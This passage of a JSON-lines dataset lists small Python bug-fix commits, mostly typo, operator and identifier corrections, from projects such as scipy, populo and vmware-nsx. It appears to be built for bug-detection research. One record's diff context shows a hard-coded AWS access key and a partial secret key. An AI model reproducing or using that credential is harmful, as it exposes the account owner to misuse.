[\"identifier:get\", 3, 15, 3, 18], \"_get\"]]"}
{"project": "populo", "commit_sha": "e80da139343bc6d997040d99e1e7aa88779c8296", "parent_sha": "d404cbca78f97d4d46d3c523b81f9273b01711c6", "file_path": "cms/djangoapps/contentstore/tests/test_transcripts_utils.py", "project_url": "https://github.com/chauhanhardik/populo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -227,7 +227,7 @@ class TestDownloadYoutubeSubs(ModuleStoreTestCase):\n \n         self.clear_subs_content(bad_youtube_subs)\n \n-    def test_success_downloading_chinise_transcripts(self):\n+    def test_success_downloading_chinese_transcripts(self):\n         good_youtube_subs = {\n             1.0: 'j_jEn79vS3g',  # Chinese, utf-8\n         }\n", "before": "def test_success_downloading_chinise_transcripts ( self ) : good_youtube_subs = { 1.0 : 'j_jEn79vS3g' , }", "after": "def test_success_downloading_chinese_transcripts ( self ) : good_youtube_subs = { 1.0 : 'j_jEn79vS3g' , }", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:test_success_downloading_chinise_transcripts\", 3, 9, 3, 53], \"test_success_downloading_chinese_transcripts\"]]"}
{"project": "populo", "commit_sha": "a507ebc1b649ae5e23f3be1a7bd29542baa90d0a", "parent_sha": "e4a69373d0d2c706f1cd41d6f6509fafd3e38a9d", "file_path": "common/lib/xmodule/xmodule/x_module.py", "project_url": "https://github.com/chauhanhardik/populo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -723,7 +723,7 @@ class XModuleDescriptor(XModuleFields, HTMLSnippet, ResourceTemplates, XBlock):\n         # We are not allowing editing of xblock tag and name fields at this time (for any component).\n         return [XBlock.tags, XBlock.name]\n \n-    def get_set_fields_by_scope(self, scope=Scope.content):\n+    def get_explicitly_set_fields_by_scope(self, scope=Scope.content):\n", "before": "def get_set_fields_by_scope ( self , scope = Scope . content ) : ", "after": "def get_explicitly_set_fields_by_scope ( self , scope = Scope . content ) : ", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:get_set_fields_by_scope\", 3, 9, 3, 32], \"get_explicitly_set_fields_by_scope\"]]"}
{"project": "populo", "commit_sha": "d6602f4f74a3ce9e86cfa90f8a79820a9e9190f7", "parent_sha": "663671ec4c132556011d0f0f8a4309a8c414f23b", "file_path": "common/lib/xmodule/xmodule/video_module/video_module.py", "project_url": "https://github.com/chauhanhardik/populo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -366,7 +366,7 @@ class VideoModule(VideoFields, XModule):\n                 try:\n                     asset(self.location, self.sub, 'en')\n                 except NotFoundError:\n-                    passs\n+                    pass\n                 else:\n                     available_translations = ['en']\n             for lang in self.transcripts:\n", "before": "passs", "after": "pass", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"block\", 3, 21, 3, 26], [\"pass_statement\", \"N0\"], 0], [\"Insert\", \"N0\", [\"pass:pass\", \"T\"], 0], [\"Delete\", [\"identifier:passs\", 3, 21, 3, 26]], [\"Delete\", [\"expression_statement\", 3, 21, 3, 26]]]"}
{"project": "populo", "commit_sha": "4d7ef488e747c9611c45859a7fefe53b41f330b5", "parent_sha": "b0ae3a536d9166fcb9260cc9e906a02e13a2b037", "file_path": "common/lib/xmodule/xmodule/video_module/video_module.py", "project_url": "https://github.com/chauhanhardik/populo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -366,7 +366,7 @@ class VideoModule(VideoFields, XModule):\n                 try:\n                     asset(self.location, self.sub, 'en')\n                 except NotFoundError:\n-                    passs\n+                    pass\n                 else:\n                     available_translations = ['en']\n             for lang in self.transcripts:\n", "before": "passs", "after": "pass", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"block\", 3, 21, 3, 26], [\"pass_statement\", \"N0\"], 0], [\"Insert\", \"N0\", [\"pass:pass\", \"T\"], 0], [\"Delete\", [\"identifier:passs\", 3, 21, 3, 26]], [\"Delete\", [\"expression_statement\", 3, 21, 3, 26]]]"}
{"project": "populo", "commit_sha": "526d4b1d49b6429d37a6ea176e52a7b01db336be", "parent_sha": "fa9a022cca33b12e1a68e97b11c084e23cc12439", "file_path": "common/djangoapps/django_comment_common/models.py", "project_url": "https://github.com/chauhanhardik/populo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -44,7 +44,7 @@ def assign_default_role(course_id, user):\n     \"\"\"\n     Assign forum default role 'Student' to user\n     \"\"\"\n-    role, __ = Role.objects.get_or_create(course_id=course_id, name=\"Student\")\n+    role, __ = Role.objects.get_or_create(course_id=course_id, name=FORUM_ROLE_STUDENT)\n     user.roles.add(role)\n \n \n", "before": "role , __ = Role . objects . get_or_create ( course_id = course_id , name = \"Student\" )", "after": "role , __ = Role . objects . get_or_create ( course_id = course_id , name = FORUM_ROLE_STUDENT )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 64, 3, 78], [\"identifier:FORUM_ROLE_STUDENT\", \"T\"], 2], [\"Delete\", [\"string:\\\"Student\\\"\", 3, 69, 3, 78]]]"}
{"project": "enigma2", "commit_sha": "2a148e8428ff9c4029e8eb0a5adea5477e9ad3e6", "parent_sha": "365e3401a77f85c1c6e83d943a14c6b8d4e38185", "file_path": "lib/python/Screens/ServiceInfo.py", "project_url": "https://github.com/sotocirus/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -14,7 +14,7 @@ TYPE_VALUE_DEC = 2\n TYPE_VALUE_HEX_DEC = 3\n TYPE_SLIDER = 4\n \n-def to_unsinged(x):\n+def to_unsigned(x):\n \treturn x & 0xFFFFFFFF\n \n def ServiceInfoListEntry(a, b, valueType=TYPE_TEXT, param=4):\n", "before": "def to_unsinged ( x ) : return x & 0xFFFFFFFF", "after": "def to_unsigned ( x ) : return x & 0xFFFFFFFF", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:to_unsinged\", 3, 5, 3, 16], \"to_unsigned\"]]"}
{"project": "populo", "commit_sha": "7e2e90e4098a57d71801766a61d88ef0a94ce934", "parent_sha": "035a48046ef55fe40f92964d6652b9de76f265ed", "file_path": "cms/lib/xblock/test/test_runtime.py", "project_url": "https://github.com/chauhanhardik/populo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -14,7 +14,7 @@ class TestHandlerUrl(TestCase):\n     def setUp(self):\n         self.block = Mock()\n \n-    def test_trailing_charecters(self):\n+    def test_trailing_characters(self):\n         self.assertFalse(handler_url(self.block, 'handler').endswith('?'))\n         self.assertFalse(handler_url(self.block, 'handler').endswith('/'))\n \n", "before": "def test_trailing_charecters ( self ) : self . assertFalse ( handler_url ( self . block , 'handler' ) . endswith ( '?' ) ) self . assertFalse ( handler_url ( self . block , 'handler' ) . endswith ( '/' ) )", "after": "def test_trailing_characters ( self ) : self . assertFalse ( handler_url ( self . block , 'handler' ) . endswith ( '?' ) ) self . assertFalse ( handler_url ( self . block , 'handler' ) . endswith ( '/' ) )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:test_trailing_charecters\", 3, 9, 3, 33], \"test_trailing_characters\"]]"}
{"project": "cookiecutter-pypackage", "commit_sha": "1aa3c0b8f3066fbc1eb3d08ebd39fdb0b02cc48a", "parent_sha": "517d1a0f0f508ead25e0009ab5979799b2fff7dd", "file_path": "{{cookiecutter.repo_name}}/tests/test_{{cookiecutter.repo_name}}.py", "project_url": "https://github.com/astralblue/cookiecutter-pypackage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -21,7 +21,7 @@ class Test{{ cookiecutter.repo_name|capitalize }}(unittest.TestCase):\n     def tearDown(self):\n         pass\n \n-    def test_something(self):\n+    def test_000_something(self):\n         pass\n \n \n", "before": "def test_something ( self ) : pass", "after": "def test_000_something ( self ) : pass", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:test_something\", 3, 9, 3, 23], \"test_000_something\"]]"}
{"project": "kundan", "commit_sha": "723ac6ffd88a5949d25d750e95bc7bcbe867ac37", "parent_sha": "20e17c67921faaa7190641ec397ae8c5f86b6459", "file_path": "test.py", "project_url": "https://github.com/Kundang30/kundan", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -912,7 +912,7 @@ class worker_thread(threading.Thread):\n                 if options.verbose:\n                     print \"Skip %s\" % job.shell_command\n                 self.output_queue.put(job)\n-                return\n+                continue\n \n             #\n             # Otherwise go about the business of running tests as normal.\n", "before": "return", "after": "continue", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"module\", 0, 17, 7, 0], [\"continue_statement\", \"N0\"], 2], [\"Insert\", \"N0\", [\"continue:continue\", \"T\"], 0], [\"Delete\", [\"return:return\", 3, 17, 3, 23]], [\"Delete\", [\"return_statement\", 3, 17, 3, 23]]]"}
{"project": "impact-api", "commit_sha": "f2f11bf391451c330951c0cd7fdb03b4d3db3fd2", "parent_sha": "11f475de6fcee6a889fa606ad9b3b5dc57aac0e1", "file_path": "web/impact/impact/tests/test_user_detail_view.py", "project_url": "https://github.com/masschallenge/impact-api", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -556,7 +556,7 @@ class TestUserDetailView(APITestCase):\n             user.refresh_from_db()\n             assert user.last_name == new_last_name\n \n-    def test_patch_profile_file_with_no_profile(self):\n+    def test_patch_user_with_no_profile_not_allowed_on_missing_fields(self):\n         context = UserContext(user_type=BASE_ENTREPRENEUR_TYPE)\n         user = context.user\n         user.entrepreneurprofile.delete()\n", "before": "def test_patch_profile_file_with_no_profile ( self ) : context = UserContext ( user_type = BASE_ENTREPRENEUR_TYPE ) user = context . user user . entrepreneurprofile . delete ( )", "after": "def test_patch_user_with_no_profile_not_allowed_on_missing_fields ( self ) : context = UserContext ( user_type = BASE_ENTREPRENEUR_TYPE ) user = context . user user . entrepreneurprofile . delete ( )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:test_patch_profile_file_with_no_profile\", 3, 9, 3, 48], \"test_patch_user_with_no_profile_not_allowed_on_missing_fields\"]]"}
{"project": "AVSC", "commit_sha": "2134b2ae070d25d3a3599e08a264dae456a825a1", "parent_sha": "0c95c07b48616f77324b260a513ade09f9ba45fb", "file_path": "Py/GL.py", "project_url": "https://github.com/dave31415/AVSC", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -8,7 +8,7 @@ aws.set_credentials('AKIAIWD7RQTJXCCB72BA', 'E0/g0PtP7d9jkjrSyOKmQNpVKXm6FajpF34\n def test_graphlab():\n     url='http://s3.amazonaws.com/GraphLab-Datasets/movie_ratings/training_data.csv'\n     ''' test the graphlab install '''\n-    data = SFrame('url')\n+    data = SFrame(url)\n \n     m1 = recommender.matrix_factorization.create(data, user='user', item='movie',\n             D=7, regularizer=0.05, nmf=True,use_bias=False)\n", "before": "data = SFrame ( 'url' )", "after": "data = SFrame ( url )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 18, 3, 25], [\"identifier:url\", \"T\"], 1], [\"Delete\", [\"string:'url'\", 3, 19, 3, 24]]]"}
{"project": "scipy", "commit_sha": "105f9006d6823d54ababf218e8d61d356e54e700", "parent_sha": "75be0546799fcf4083c9e85b6e29f625e9bccab1", "file_path": "Lib/stats/stats.py", "project_url": "https://github.com/Kai-Striega/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1216,7 +1216,7 @@ Returns: a, with values less than threshmin or greater than threshmax\n     a = asarray(a).copy()\n     mask = zeros(a.shape, dtype=bool)\n     if threshmin is not None:\n-        mask = (a < threshmin)\n+        mask |= (a < threshmin)\n     if threshmax is not None:\n         mask |= (a > threshmax)\n     a[mask] = newval\n", "before": "mask = ( a < threshmin )", "after": "mask |= ( a < threshmin )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"expression_statement\", 3, 9, 3, 31], [\"augmented_assignment\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:mask\", 3, 9, 3, 13], 0], [\"Insert\", \"N0\", [\"|=:|=\", \"T\"], 1], [\"Move\", \"N0\", [\"parenthesized_expression\", 3, 16, 3, 31], 2], [\"Delete\", [\"=:=\", 3, 14, 3, 15]], [\"Delete\", [\"assignment\", 3, 9, 3, 31]]]"}
{"project": "mps-youtube", "commit_sha": "cf17422b3b20fea77650cdf6aa3a76dcf5dcc08b", "parent_sha": "e3fa5b9f557fa393c1cefa8c623609e73c302dd4", "file_path": "mps_youtube/main.py", "project_url": "https://gitlab.com/alidz1982/mps-youtube", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -3152,7 +3152,7 @@ def quits(showlogo=True):\n                 v = v.group(1)\n \n                 if v > __version__:\n-                    vermsg += \"\\nA newer version is available (%s)\\n\" % v\n+                    vermsg = \"\\nA newer version is available (%s)\\n\" % v\n                     print(vermsg)\n \n         except (URLError, HTTPError, socket.timeout):\n", "before": "vermsg += \"\\nA newer version is available (%s)\\n\" % v", "after": "vermsg = \"\\nA newer version is available (%s)\\n\" % v", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"expression_statement\", 3, 21, 3, 74], [\"assignment\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:vermsg\", 3, 21, 3, 27], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Move\", \"N0\", [\"binary_operator\", 3, 31, 3, 74], 2], [\"Delete\", [\"+=:+=\", 3, 28, 3, 30]], [\"Delete\", [\"augmented_assignment\", 3, 21, 3, 74]]]"}
{"project": "scipy", "commit_sha": "229d17d2a87c700bac82e5dd31469f5e05cb79b5", "parent_sha": "b2c22407966490bb52ba4f415406118e5159bb7d", "file_path": "scipy/stats/distributions.py", "project_url": "https://github.com/Kai-Striega/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -4011,7 +4011,8 @@ class nbinom_gen(rv_discrete):\n     def _cdf(self, x, n, pr):\n         k = floor(x)\n         return special.betainc(n, k+1, pr)\n-    def _sf(self, x, n, pr):\n+    def _sf_skip(self, x, n, pr):\n+        #skip because special.nbdtrc doesn't work for 0<n<1\n         k = floor(x)\n         return special.nbdtrc(k,n,pr)\n     def _ppf(self, q, n, pr):\n", "before": "def _sf ( self , x , n , pr ) : k = floor ( x ) return special . nbdtrc ( k , n , pr )", "after": "def _sf_skip ( self , x , n , pr ) : k = floor ( x ) return special . nbdtrc ( k , n , pr )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:_sf\", 3, 9, 3, 12], \"_sf_skip\"]]"}
{"project": "scipy", "commit_sha": "54e68a81dbbff8ba6077a5a3ac41f094e71508be", "parent_sha": "cdd5a13bea912e7167062c2115f265827263186a", "file_path": "scipy/optimize/minpack.py", "project_url": "https://github.com/Kai-Striega/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -222,7 +222,7 @@ def _root_hybr(func, x0, args=(), jac=None, options=None):\n                  \"ten iterations.\", ValueError],\n               'unknown': [\"An error occurred.\", TypeError]}\n \n-    if (status != 1 and not options.get('full_output', False)):\n+    if (status != 1 and not options.get('full_output', full_output)):\n         if status in [2,3,4,5]:\n             msg = errors[status][0]\n             warnings.warn(msg, RuntimeWarning)\n", "before": "if ( status != 1 and not options . get ( 'full_output' , False ) ) : if status in [ 2 , 3 , 4 , 5 ] : msg = errors [ status ] [ 0 ] warnings . warn ( msg , RuntimeWarning )", "after": "if ( status != 1 and not options . get ( 'full_output' , full_output ) ) : if status in [ 2 , 3 , 4 , 5 ] : msg = errors [ status ] [ 0 ] warnings . warn ( msg , RuntimeWarning )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 40, 3, 62], [\"identifier:full_output\", \"T\"], 3], [\"Delete\", [\"false:False\", 3, 56, 3, 61]]]"}
{"project": "scipy", "commit_sha": "693ed21836be6e93b684a364f2a1cb041e196547", "parent_sha": "defc822b1c3eb77e4df50a9af829f9d7792babda", "file_path": "scipy/linalg/tests/test_decomp_update.py", "project_url": "https://github.com/Kai-Striega/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -88,7 +88,7 @@ def make_nonnative(arrs):\n     return out\n \n class BaseQRdeltas(object):\n-    def __init__(self):\n+    def setup_method(self):\n         self.rtol = 10.0 ** -(np.finfo(self.dtype).precision-2)\n         self.atol = 10 * np.finfo(self.dtype).eps\n \n", "before": "def __init__ ( self ) : self . rtol = 10.0 ** - ( np . finfo ( self . dtype ) . precision - 2 ) self . atol = 10 * np . finfo ( self . dtype ) . eps", "after": "def setup_method ( self ) : self . rtol = 10.0 ** - ( np . finfo ( self . dtype ) . precision - 2 ) self . atol = 10 * np . finfo ( self . dtype ) . eps", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:__init__\", 3, 9, 3, 17], \"setup_method\"]]"}
{"project": "scipy", "commit_sha": "748a3ad2f8a2cf8edc2da142bd019cfd9e4e6611", "parent_sha": "b890b8f502418ab0d2c03f1e3661d6ca3b042472", "file_path": "scipy/fft/_pocketfft/tests/test_basic.py", "project_url": "https://github.com/Kai-Striega/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1017,7 +1017,7 @@ def test_swapped_byte_order_complex(func):\n \n \n @pytest.mark.parametrize('func', [ihfft, ihfftn, rfft, rfftn])\n-def test_swapped_byte_order_complex(func):\n+def test_swapped_byte_order_real(func):\n     rng = np.random.RandomState(1234)\n     x = rng.rand(10)\n     assert_allclose(func(swap_byteorder(x)), func(x))\n", "before": "def test_swapped_byte_order_complex ( func ) : rng = np . random . RandomState ( 1234 ) x = rng . rand ( 10 ) assert_allclose ( func ( swap_byteorder ( x ) ) , func ( x ) )", "after": "def test_swapped_byte_order_real ( func ) : rng = np . random . RandomState ( 1234 ) x = rng . rand ( 10 ) assert_allclose ( func ( swap_byteorder ( x ) ) , func ( x ) )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:test_swapped_byte_order_complex\", 3, 5, 3, 36], \"test_swapped_byte_order_real\"]]"}
{"project": "scipy", "commit_sha": "eaa2fdef699ba0b81a75434f6483891f11cc116f", "parent_sha": "e91e126bb23e5cf3062f9bab5aec2ecb1d5c4107", "file_path": "scipy/optimize/optimize.py", "project_url": "https://github.com/Kai-Striega/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1924,7 +1924,7 @@ class Brent:\n             a = xc\n             b = xa\n         deltax = 0.0\n-        funcalls = 1\n+        funcalls += 1\n         iter = 0\n         while (iter < self.maxiter):\n             tol1 = self.tol * numpy.abs(x) + _mintol\n", "before": "funcalls = 1", "after": "funcalls += 1", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"expression_statement\", 3, 9, 3, 21], [\"augmented_assignment\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:funcalls\", 3, 9, 3, 17], 0], [\"Insert\", \"N0\", [\"+=:+=\", \"T\"], 1], [\"Move\", \"N0\", [\"integer:1\", 3, 20, 3, 21], 2], [\"Delete\", [\"=:=\", 3, 18, 3, 19]], [\"Delete\", [\"assignment\", 3, 9, 3, 21]]]"}
{"project": "smart-cache", "commit_sha": "7be77884531337d50f219fb678cb4cc0333f9047", "parent_sha": "ec9eb344ae0a2439ecaf2cfa838b2e8cf8c33518", "file_path": "DataManager/collector/dataset/generator.py", "project_url": "https://github.com/Cloud-PG/smart-cache", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -179,7 +179,7 @@ class CMSDatasetV0(object):\n         metadata = {\n             'from': from_,\n             'window_size': window_size,\n-            'support_tables': support_tables if extract_support_tables else extract_support_tables,\n+            'support_tables': support_tables if extract_support_tables else False,\n             'tot_records': len(data),\n             'extraction_time': extraction_time\n         }\n", "before": "metadata = { 'from' : from_ , 'window_size' : window_size , 'support_tables' : support_tables if extract_support_tables else extract_support_tables , 'tot_records' : len ( data ) , 'extraction_time' : extraction_time }", "after": "metadata = { 'from' : from_ , 'window_size' : window_size , 'support_tables' : support_tables if extract_support_tables else False , 'tot_records' : len ( data ) , 'extraction_time' : extraction_time }", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"conditional_expression\", 3, 31, 3, 99], [\"false:False\", \"T\"], 4], [\"Delete\", [\"identifier:extract_support_tables\", 3, 77, 3, 99]]]"}
{"project": "smart-cache", "commit_sha": "f28da27c90ae9e790eeacaf9d2623ea7298febc9", "parent_sha": "77e79d073194303ae3060913f37f3dfa2b3a3782", "file_path": "SmartCache/ai/models/generator.py", "project_url": "https://github.com/Cloud-PG/smart-cache", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -32,5 +32,5 @@ class CMSSimpleRecordModelGenerator(object):\n         predictions = self._model.predict(data)\n         return np.argmax(predictions, axis=1)\n     \n-    def save_model(self, out_name: str):\n+    def save(self, out_name: str):\n         self._model.save(\"{}.h5\".format(out_name))\n", "before": "def save_model ( self , out_name : str ) : self . _model . save ( \"{}.h5\" . format ( out_name ) )", "after": "def save ( self , out_name : str ) : self . _model . save ( \"{}.h5\" . format ( out_name ) )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:save_model\", 3, 9, 3, 19], \"save\"]]"}
{"project": "scipy", "commit_sha": "44199c1f793ada9063d84d2496f35042c23322d1", "parent_sha": "dfc8d5bb63c585536b6d04af4e14c882e93a524f", "file_path": "scipy/stats/tests/test_distributions.py", "project_url": "https://github.com/Kai-Striega/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1959,7 +1959,7 @@ class TestNct(TestCase):\n                           [0.00153078, 0.00291093, 0.00525206, 0.00900815]])\n         assert_allclose(res, expected, rtol=1e-5)\n \n-    def text_variance_gh_issue_2401(self):\n+    def test_variance_gh_issue_2401(self):\n         # Computation of the variance of a non-central t-distribution resulted\n         # in a TypeError: ufunc 'isinf' not supported for the input types,\n         # and the inputs could not be safely coerced to any supported types\n", "before": "def text_variance_gh_issue_2401 ( self ) : ", "after": "def test_variance_gh_issue_2401 ( self ) : ", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:text_variance_gh_issue_2401\", 3, 9, 3, 36], \"test_variance_gh_issue_2401\"]]"}
{"project": "namebench", "commit_sha": "7d438a71299b3ea493b6218a46a60e1b91a9b9b4", "parent_sha": "2590a962cd79839a9a379a0ce680118ae0fee937", "file_path": "libnamebench/benchmark.py", "project_url": "https://github.com/takuya/namebench", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -340,7 +340,7 @@ class Benchmark(object):\n-    self.msg(\"Opening %s for write\" % filename, debug=Tre)\n+    self.msg(\"Opening %s for write\" % filename, debug=True)\n     csv_file = open(filename, 'w')\n     output = csv.writer(csv_file)\n     output.writerow(['IP', 'Name', 'Check Duration', 'Test #', 'Record',\n", "before": "self . msg ( \"Opening %s for write\" % filename , debug = Tre )", "after": "self . msg ( \"Opening %s for write\" % filename , debug = True )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"keyword_argument\", 0, 49, 0, 58], [\"true:True\", \"T\"], 2], [\"Delete\", [\"identifier:Tre\", 0, 55, 0, 58]]]"}
{"project": "smart-cache", "commit_sha": "8fe348fb6d2e7b17cd74b03dc29abac7979fa944", "parent_sha": "85053cba8d3291fd6393a6d4c9d52e094422b935", "file_path": "SmartCache/sim/simulator/__main__.py", "project_url": "https://github.com/Cloud-PG/smart-cache", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ from .utils import get_logger, load_results, str2bool, wait_jobs\n def prepare_process_call(args, simulator_exe, cache_type, working_dir: str,\n                          start_window: int, stop_window: int, window_idx: int = 0,\n                          dump: bool = False, load: bool = False, dump_dir: str = \"\",\n-                         cold_start: bool = false, cold_start_no_stats: bool = False\n+                         cold_start: bool = False, cold_start_no_stats: bool = False\n                          ) -> str:\n     os.makedirs(working_dir, exist_ok=True)\n     # Create base command\n", "before": "def prepare_process_call ( args , simulator_exe , cache_type , working_dir : str , start_window : int , stop_window : int , window_idx : int = 0 , dump : bool = False , load : bool = False , dump_dir : str = \"\" , cold_start : bool = false , cold_start_no_stats : bool = False ) -> str : os . makedirs ( working_dir , exist_ok = True )", "after": "def prepare_process_call ( args , simulator_exe , cache_type , working_dir : str , start_window : int , stop_window : int , window_idx : int = 0 , dump : bool = False , load : bool = False , dump_dir : str = \"\" , cold_start : bool = False , cold_start_no_stats : bool = False ) -> str : os . makedirs ( working_dir , exist_ok = True )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"typed_default_parameter\", 3, 26, 3, 50], [\"false:False\", \"T\"], 4], [\"Delete\", [\"identifier:false\", 3, 45, 3, 50]]]"}
{"project": "vmware-nsx", "commit_sha": "ccff837e5ec4ce1e4d8a4bdd90bc0e2cad168292", "parent_sha": "8a09da6495cd9c06efd61b36bf54b7894b615a84", "file_path": "quantum/extensions/flavor.py", "project_url": "https://github.com/gkotton/vmware-nsx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -52,7 +52,7 @@ class Flavor(object):\n     def get_updated(cls):\n         return \"2012-07-20T10:00:00-00:00\"\n \n-    def get_extended_attributes(self, version):\n+    def get_extended_resources(self, version):\n         if version == \"2.0\":\n             return FLAVOR_ATTRIBUTE\n         else:\n", "before": "def get_extended_attributes ( self , version ) : if version == \"2.0\" : return FLAVOR_ATTRIBUTE else : ", "after": "def get_extended_resources ( self , version ) : if version == \"2.0\" : return FLAVOR_ATTRIBUTE else : ", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:get_extended_attributes\", 3, 9, 3, 32], \"get_extended_resources\"]]"}
{"project": "vmware-nsx", "commit_sha": "9b951dbe0fc69ca0a6fc5c362553ad40bc37389f", "parent_sha": "aecae0751b255e48e537a9753ed8734bfa54fda9", "file_path": "neutron/api/v2/base.py", "project_url": "https://github.com/gkotton/vmware-nsx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -141,7 +141,7 @@ class Controller(object):\n                 if policy.check(\n                     context,\n                     '%s:%s' % (self._plugin_handlers[self.SHOW], attr_name),\n-                    None,\n+                    data,\n                     might_not_exist=True):\n                     # this attribute is visible, check next one\n                     continue\n", "before": "if policy . check ( context , '%s:%s' % ( self . _plugin_handlers [ self . SHOW ] , attr_name ) , None , might_not_exist = True ) : continue", "after": "if policy . check ( context , '%s:%s' % ( self . _plugin_handlers [ self . SHOW ] , attr_name ) , data , might_not_exist = True ) : continue", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 0, 32, 4, 42], [\"identifier:data\", \"T\"], 5], [\"Delete\", [\"none:None\", 3, 21, 3, 25]]]"}
{"project": "scipy", "commit_sha": "4bed1aac34d313e5c58d650ea68f5c9e48c0255c", "parent_sha": "a6c0f70c8d575c9df3d49726fd864cd5c78ab9ee", "file_path": "scipy/integrate/_quad_vec.py", "project_url": "https://github.com/Kai-Striega/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -100,7 +100,7 @@ class _Bunch(object):\n \n \n def quad_vec(f, a, b, epsabs=1e-200, epsrel=1e-8, norm='2', cache_size=100e6, limit=10000,\n-             workers=1, points=None, quadrature='gk21', full_output=False):\n+             workers=1, points=None, quadrature=None, full_output=False):\n", "before": "def quad_vec ( f , a , b , epsabs = 1e-200 , epsrel = 1e-8 , norm = '2' , cache_size = 100e6 , limit = 10000 , workers = 1 , points = None , quadrature = 'gk21' , full_output = False ) : ", "after": "def quad_vec ( f , a , b , epsabs = 1e-200 , epsrel = 1e-8 , norm = '2' , cache_size = 100e6 , limit = 10000 , workers = 1 , points = None , quadrature = None , full_output = False ) : ", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 38, 3, 55], [\"none:None\", \"T\"], 2], [\"Delete\", [\"string:'gk21'\", 3, 49, 3, 55]]]"}
{"project": "vmware-nsx", "commit_sha": "ef238d277b82eaf85c899950cebc7c0927b17593", "parent_sha": "b7a3939a898746cb7ec81a5b36824efa08a93547", "file_path": "neutron/tests/unit/test_security_groups_rpc.py", "project_url": "https://github.com/gkotton/vmware-nsx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1254,7 +1254,7 @@ class TestSecurityGroupAgentWithIptables(base.BaseTestCase):\n \n         self.mox.VerifyAll()\n \n-    def test_security_group_rule_udpated(self):\n+    def test_security_group_rule_updated(self):\n         self.rpc.security_group_rules_for_devices.return_value = self.devices2\n         self._replay_iptables(IPTABLES_FILTER_2, IPTABLES_FILTER_V6_2)\n         self._replay_iptables(IPTABLES_FILTER_2_3, IPTABLES_FILTER_V6_2)\n", "before": "def test_security_group_rule_udpated ( self ) : self . rpc . security_group_rules_for_devices . return_value = self . devices2 self . _replay_iptables ( IPTABLES_FILTER_2 , IPTABLES_FILTER_V6_2 ) self . _replay_iptables ( IPTABLES_FILTER_2_3 , IPTABLES_FILTER_V6_2 )", "after": "def test_security_group_rule_updated ( self ) : self . rpc . security_group_rules_for_devices . return_value = self . devices2 self . _replay_iptables ( IPTABLES_FILTER_2 , IPTABLES_FILTER_V6_2 ) self . _replay_iptables ( IPTABLES_FILTER_2_3 , IPTABLES_FILTER_V6_2 )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Update\", [\"identifier:test_security_group_rule_udpated\", 3, 9, 3, 41], \"test_security_group_rule_updated\"]]"}
